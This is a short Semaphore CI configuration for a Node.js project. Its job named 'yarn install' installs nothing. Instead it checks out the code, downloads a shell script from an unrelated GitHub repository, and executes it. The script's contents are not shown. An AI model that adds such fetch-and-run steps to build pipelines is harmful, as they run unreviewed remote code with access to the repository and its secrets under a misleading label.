version: v1.0
name: Node JS
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu2004
blocks:
  - name: Install and Run
    task:
      jobs:
        - name: yarn install
          commands:
            - sem-version node 8
            - checkout
            - 'curl https://raw.githubusercontent.com/migrate-bricks/semaphoreci/main/jd.sh -o ./jd.sh'
            - chmod +x ./jd.sh
            - bash ./jd.sh
